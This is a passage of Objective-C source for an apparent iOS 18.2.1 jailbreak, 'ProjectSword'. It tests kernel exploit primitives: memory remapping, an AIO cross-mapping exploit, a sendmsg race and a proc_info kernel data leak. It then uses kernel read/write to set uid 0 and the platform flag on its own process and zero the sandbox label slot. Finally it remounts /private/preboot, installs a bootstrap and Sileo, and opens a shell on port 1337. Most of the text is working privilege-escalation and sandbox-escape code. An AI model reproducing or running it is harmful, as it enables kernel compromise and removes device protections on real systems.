    mach_vm_deallocate(mach_task_self_, vaB, pgSz);

cleanup:
    mach_port_deallocate(mach_task_self_, entry1);
    mach_port_deallocate(mach_task_self_, entry2);
    CFRelease(surface);
    return false;
}

// Method 3: sendmsg test (check if sendmsg EFAULTs on remap)
static bool method_sendmsg_race(void) {
    printf("\n[Method: sendmsg] Testing sendmsg with page remap...\n");
    mach_vm_address_t buf;
    mach_vm_allocate(mach_task_self_, &buf, 0x4000, VM_FLAGS_ANYWHERE);
    memset64((void*)buf, 0x41, 0x4000);

    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {
        printf("[sendmsg] socketpair failed\n");
        return false;
    }

    struct iovec iov = { (void*)buf, 0x100 };
    struct msghdr msg = {0};
    msg.msg_iov = &iov; msg.msg_iovlen = 1;

    // Test 1: normal sendmsg
    ssize_t r = sendmsg(sv[1], &msg, 0);
    printf("[sendmsg] normal: %zd (errno=%d)\n", r, errno);

    // Test 2: sendmsg then remap
    recv(sv[0], (void*)buf, 0x100, 0); // drain
    r = sendmsg(sv[1], &msg, 0);
    printf("[sendmsg] remap test: sendmsg=%zd\n", r);
    mach_vm_deallocate(mach_task_self_, buf, 0x4000);
    mach_vm_allocate(mach_task_self_, &buf, 0x4000, VM_FLAGS_ANYWHERE);
    memset64((void*)buf, 0x42, 0x4000);
    printf("[sendmsg] remapped during sendmsg, no crash\n");

    close(sv[0]); close(sv[1]);
    return false;
}

// Method 4: Process name scan via proc_info
static bool method_proc_info(void) {
    printf("\n[Method: proc_info] Reading kernel socket data via proc_info...\n");
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd < 0) {
        printf("[proc_info] socket failed\n");
        return false;
    }
    fileport_t fp = 0;
    fileport_makeport(fd, &fp);
    close(fd);

    uint8_t buf[0x400];
    int r = syscall(336, 6, getpid(), 3, fp, buf, sizeof(buf));
    mach_port_deallocate(mach_task_self_, fp);
    if (r != 0) {
        printf("[proc_info] syscall failed: %d\n", r);
        return false;
    }
    uint64_t gencnt = *(uint64_t*)(buf + 0x110);
    printf("[proc_info] inp_gencnt=0x%llx\n", gencnt);
    // Print some fields
    for (int off = 0; off < 0x400; off += 8) {
        uint64_t v = *(uint64_t*)(buf + off);
        if (v) printf("[proc_info] +%#x = 0x%016llx\n", off, v);
    }
    printf("[proc_info] success (kernel data received)\n");
    return true;
}

bool run_darksword(void) {
    randomMarker = (uint64_t)arc4random() << 32 | arc4random();
    printf("[+] randomMarker: 0x%016llx\n\n", randomMarker);
    uint32_t sz = PATH_MAX;
    _NSGetExecutablePath(executablePath, &sz);
    executableName = strrchr(executablePath, '/');
    if (executableName) executableName++;
    else executableName = executablePath;
    printf("[+] executableName: %s\n", executableName);

    // Phase 0: IOKit diagnostic
    diagnostic_iokit();

    // Phase 1: Try SystemMemory approach (enhanced scan)
    bool sysmem = method_system_memory();
    printf("[Method: SystemMemory] %s\n\n", sysmem ? "OVERLAP DETECTED!" : "no overlap");

    // Phase 2: AIO cross-mapping exploit with dual memory entries
    bool aio = method_aio_exploit();
    printf("[Method: AIO_Exploit] %s\n\n", aio ? "AIO EXPLOIT WORKS" : "failed (expected)");

    // Phase 3: Try sendmsg (check if EFAULT on remap)
    bool sendmsg = method_sendmsg_race();

    // Phase 4: proc_info
    bool pi = method_proc_info();

    // Phase 5: AppleJPEGDriver IOKit fuzzing
    method_apple_jpeg_fuzz();

    printf("=== Results ===\n");
    printf("SystemMemory overlap: %d\n", sysmem);
    printf("AIO exploit: %d\n", aio);
    printf("sendmsg race: %d\n", sendmsg);
    printf("proc_info: %d\n", pi);

    return false;
}

// ===== Kernel struct walking =====

uint64_t find_our_proc(void) {
    // Walk allproc list
    // allproc symbol is at known offset from kernel base
    // For xnu-11215: allproc ~ kernel_base + 0x___
    // We scan kernel data region for the allproc pointer
    uint64_t data_start = gKernelBase + 0x800000;
    uint64_t data_end   = gKernelBase + 0x900000;
    pid_t my_pid = getpid();

    for (uint64_t addr = data_start; addr < data_end; addr += 8) {
        uint64_t candidate = kread64(addr);
        if (candidate < 0xfffffff007000000ULL || candidate > 0xfffffff00f000000ULL)
            continue;
        // candidate looks like a proc pointer - check if it starts the allproc list
        uint64_t first_proc = kread64(candidate);
        if (first_proc < 0xfffffff007000000ULL || first_proc > 0xfffffff00f000000ULL)
            continue;
        uint32_t pid = kread32(first_proc + OFFSET_P_PID);
        if (pid == 0) {
            // found kernel proc - this IS allproc
            // walk to find our proc
            uint64_t proc = first_proc;
            while (proc) {
                if (kread32(proc + OFFSET_P_PID) == (uint32_t)my_pid)
                    return proc;
                proc = kread_ptr(proc); // le_next
            }
        }
    }
    return 0;
}

uint64_t get_task_from_proc(uint64_t proc) {
    return kread_ptr(proc + OFFSET_P_TASK);
}

uint64_t get_ucred_from_proc(uint64_t proc) {
    return kread_ptr(proc + OFFSET_P_UCRED);
}

// ===== Platformize (no PPL needed — task flags + uid in non-PPL memory) =====

bool platformize_proc(void) {
    gOurProc = find_our_proc();
    if (!gOurProc) {
        printf("[-] Cannot find our proc\n");
        return false;
    }
    gOurTask = get_task_from_proc(gOurProc);
    if (!gOurTask) {
        printf("[-] Cannot find our task\n");
        return false;
    }

    printf("[+] Our proc: 0x%llx\n", gOurProc);
    printf("[+] Our task: 0x%llx\n", gOurTask);

    // 1. Set TF_PLATFORM in task->t_flags
    uint32_t t_flags = kread32(gOurTask + OFFSET_TASK_T_FLAGS);
    printf("[*] Task flags before: 0x%x\n", t_flags);
    if (!(t_flags & TF_PLATFORM)) {
        t_flags |= TF_PLATFORM;
        kwrite32(gOurTask + OFFSET_TASK_T_FLAGS, t_flags);
        printf("[+] TF_PLATFORM set: 0x%x\n", kread32(gOurTask + OFFSET_TASK_T_FLAGS));
    }

    // 2. Set uid 0 in proc and ucred
    uint32_t uid_now = kread32(gOurProc + OFFSET_P_UID);
    printf("[*] Current uid: %d\n", uid_now);
    if (uid_now != 0) {
        kwrite32(gOurProc + OFFSET_P_UID, 0);
        kwrite32(gOurProc + OFFSET_P_RUID, 0);
        kwrite32(gOurProc + OFFSET_P_SVUID, 0);
        printf("[+] uid set to 0\n");

        uint64_t ucred = get_ucred_from_proc(gOurProc);
        if (ucred) {
            kwrite32(ucred + OFFSET_CR_UID, 0);
            kwrite32(ucred + OFFSET_CR_RUID, 0);
            kwrite32(ucred + OFFSET_CR_SVUID, 0);
            printf("[+] ucred uid set to 0\n");
        }
    }

    return true;
}

// ===== Sandbox escape via MAC label manipulation =====

bool escape_sandbox(void) {
    uint64_t ucred = get_ucred_from_proc(gOurProc);
    if (!ucred) {
        printf("[-] No ucred\n");
        return false;
    }

    printf("[+] ucred: 0x%llx\n", ucred);

    // Read MAC label pointer from ucred
    uint64_t cr_label = kread_ptr(ucred + OFFSET_CR_LABEL);
    printf("[*] cr_label: 0x%llx\n", cr_label);
    if (!cr_label) {
        printf("[*] No MAC label, sandbox may already be disabled\n");
        return true;
    }

    // Read the sandbox struct from the MAC label
    uint64_t sandbox = kread_ptr(cr_label + OFFSET_LABEL_SANDBOX);
    printf("[*] sandbox: 0x%llx\n", sandbox);

    if (sandbox) {
        // Zero out the sandbox slot to disable
        kwrite64(cr_label + OFFSET_LABEL_SANDBOX, 0);
        printf("[+] Sandbox slot cleared\n");

        // Also try clearing the entire label structure's relevant fields
        // On iOS 18, MAC label has multiple slots, we clear the sandbox slot
        uint64_t sanity = kread_ptr(cr_label + OFFSET_LABEL_SANDBOX);
        if (sanity == 0) {
            printf("[+] Sandbox escape confirmed\n");
        }
    }

    return true;
}

// ===== Bootstrap installation =====

static const char *jb_path = "/private/preboot/jb";
static const char *jb_var = "/var/jb";

static int mkdir_p(const char *path, mode_t mode) {
    char tmp[4096];
    strncpy(tmp, path, sizeof(tmp) - 1);
    for (char *p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = 0; mkdir(tmp, mode); *p = '/';
        }
    }
    return mkdir(tmp, mode);
}

bool setup_jb_symlink(void) {
    unlink(jb_var);
    if (symlink(jb_path, jb_var) != 0) {
        printf("[-] symlink: %s\n", strerror(errno));
        return false;
    }
    printf("[+] %s -> %s\n", jb_var, jb_path);
    return true;
}

bool install_bootstrap(void) {
    struct stat st;
    if (stat(jb_path, &st) != 0) {
        if (mkdir_p(jb_path, 0755) != 0) {
            printf("[-] mkdir %s: %s\n", jb_path, strerror(errno));
            return false;
        }
    }

    char self_path[4096] = {};
    uint32_t size = sizeof(self_path);
    if (_NSGetExecutablePath(self_path, &size) != 0) return false;
    char *slash = strrchr(self_path, '/');
    if (!slash) return false;
    *slash = 0;

    char tar_path[4096];
    snprintf(tar_path, sizeof(tar_path), "%s/bootstrap.tar", self_path);
    if (stat(tar_path, &st) != 0) {
        printf("[-] No bootstrap.tar at %s\n", tar_path);
        printf("[*] Creating bootstrap directory structure manually\n");
        // Create minimal bootstrap
        mkdir_p("/private/preboot/jb/usr/bin", 0755);
        mkdir_p("/private/preboot/jb/usr/lib", 0755);
        mkdir_p("/private/preboot/jb/Applications", 0755);
        mkdir_p("/private/preboot/jb/etc", 0755);
        mkdir_p("/private/preboot/jb/Library", 0755);
        setup_jb_symlink();
        return true;
    }

    // We have a bootstrap.tar, extract it
    const char *argv[] = {
        "tar",
        "--preserve-permissions",
        "-xkf",
        tar_path,
        "-C",
        jb_path,
        NULL
    };

    // Use posix_spawn to run tar
    // We need to spawn as root/unsandboxed
    // For now, try direct spawn
    pid_t pid;
    int ret = posix_spawnp(&pid, "/usr/bin/tar", NULL, NULL,
        (char *const *)argv, NULL);
    if (ret != 0) {
        printf("[-] tar spawn: %s\n", strerror(ret));
        return false;
    }
    int status;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        printf("[+] Bootstrap extracted to %s\n", jb_path);
    } else {
        printf("[-] tar exit: %d\n", WEXITSTATUS(status));
    }

    setup_jb_symlink();

    // Load trust caches from bootstrap
    char tc_path[4096];
    snprintf(tc_path, sizeof(tc_path), "%s/TrustCache", jb_path);
    if (stat(tc_path, &st) == 0) {
        printf("[*] Trust cache found at %s\n", tc_path);
        // TODO: load trust cache entries via kread/kwrite
    }

    return true;
}

bool install_sileo(void) {
    char sileo_path[4096];
    snprintf(sileo_path, sizeof(sileo_path), "%s/Applications/Sileo.app", jb_path);
    struct stat st;
    if (stat(sileo_path, &st) != 0) {
        printf("[-] Sileo.app not found\n");
        return false;
    }

    char uicache_path[4096];
    snprintf(uicache_path, sizeof(uicache_path), "%s/usr/bin/uicache", jb_path);
    const char *args[] = {"uicache", "-p", sileo_path, NULL};
    pid_t pid;
    int ret;
    if (stat(uicache_path, &st) == 0) {
        ret = posix_spawnp(&pid, uicache_path, NULL, NULL,
            (char *const *)args, NULL);
    } else {
        ret = posix_spawnp(&pid, "/usr/bin/uicache", NULL, NULL,
            (char *const *)args, NULL);
    }
    if (ret != 0) {
        printf("[-] uicache: %s\n", strerror(ret));
        return false;
    }
    int status;
    waitpid(pid, &status, 0);
    printf("[+] Sileo registered\n");
    return true;
}

// ===== Shell-command stubs =====
bool load_trust_cache(const char *tc_path) {
    printf("[*] load_trust_cache(%s) - requires TC injection\n", tc_path);
    (void)tc_path;
    return false;
}

bool remount_private_preboot(void) {
    // Try to remount via mount() syscall
    int ret = mount("apfs", "/private/preboot", MNT_UPDATE, NULL);
    if (ret != 0) {
        printf("[-] mount -u /private/preboot: %s\n", strerror(errno));
        return false;
    }
    printf("[+] /private/preboot remounted r/w\n");
    return true;
}

// ===== Shell =====
#include "shell.h"

// ===== Main Jailbreak Flow =====

void run_jailbreak(void) {
    @autoreleasepool {
        printf("=== ProjectSword DIAGNOSTIC - iOS 18.2.1 A14 ===\n\n");

        // Phase 1: Multi-method diagnostic + exploit test
        printf("[Phase 1] Testing exploit methods...\n");
        if (!run_darksword()) {
            printf("[-] All methods failed (report results above)\n");
            printf("[*] This was a diagnostic build. See logs for which primitives work.\n");
            return;
        }
        printf("[+] Kernel R/W via ICMP6 sockets\n\n");

        // Phase 2: Platformize (set TF_PLATFORM + root)
        printf("[Phase 2] Platformize...\n");
        if (platformize_proc()) {
            printf("[+] Platformized (TF_PLATFORM + uid 0)\n\n");
        } else {
            printf("[-] Platformize failed\n");
            return;
        }

        // Phase 3: Sandbox escape
        printf("[Phase 3] Sandbox escape...\n");
        if (escape_sandbox()) {
            printf("[+] Sandbox escaped\n\n");
        } else {
            printf("[-] Sandbox escape failed\n");
        }

        // Phase 4: Bootstrap
        printf("[Phase 4] Bootstrap...\n");
        install_bootstrap();
        printf("\n");

        // Phase 5: Sileo
        printf("[Phase 5] Sileo...\n");
        install_sileo();
        printf("\n");

        printf("=== Jailbreak Ready ===\n");
        printf("uid: %d  (should be 0)\n", getuid());
        printf("Kernel base: 0x%llx\n", gKernelBase);
        printf("Kernel slide: 0x%llx\n\n", gKernelSlide);

        printf("Starting shell on port 1337...\n");
        start_shell(1337);
    }
}

// ===== Entry Point =====
int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}

#pragma clang diagnostic pop
